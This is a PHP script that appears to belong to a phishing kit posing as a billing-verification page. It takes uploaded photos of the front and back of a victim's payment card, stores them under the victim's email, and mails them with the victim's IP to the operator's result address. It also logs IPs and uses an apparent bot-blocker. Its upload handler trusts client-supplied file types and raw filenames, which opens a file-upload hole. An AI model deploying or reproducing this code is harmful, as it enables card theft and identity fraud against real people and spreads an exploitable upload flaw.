<?php
session_start();
require_once("../main.php");
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once("../lang.php");
require_once("../session.php");
$username = $_SESSION['emailBill'];
$ip = getUserIP();
if(isset($_FILES["file"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file"]["name"]);
$file_extension = end($temporary);
    if ((($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/jpg") || ($_FILES["file"]["type"] == "image/jpeg"))){
        $sourcePath = $_FILES['file']['tmp_name'];
        $targetPath = "../upload/frontcc_".$username."_". $_FILES["file"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
        $from = $_SESSION['from'];
        $subject = "💟 FRONT CC: ".strtoupper($_SESSION['emailBill'])." // $cn - $os - $ip";
        kirim_foto($config['email_result'], $from, $subject, $targetPath);
        tulis_file("../result/total_photocc.txt", $ip);
        }
}
else
{
}
if(isset($_FILES["file2"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file2"]["name"]);
$file_extension = end($temporary);
    if ((($_FILES["file2"]["type"] == "image/png") || ($_FILES["file2"]["type"] == "image/jpg") || ($_FILES["file2"]["type"] == "image/jpeg"))){
        $sourcePath = $_FILES['file2']['tmp_name'];
        $targetPath = "../upload/backcc_".$username."_". $_FILES["file2"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
        $from = $_SESSION['from'];
        $subject = "💟 BACK CC: ".strtoupper($_SESSION['emailBill'])." // $cn - $os - $ip";
        kirim_foto($config['email_result'], $from, $subject, $targetPath);
        }
}
else
{
}
echo "<title>".$language['billing']['title']."</title><META HTTP-EQUIV='refresh' content='0; URL=done?session=$key'>";
?>
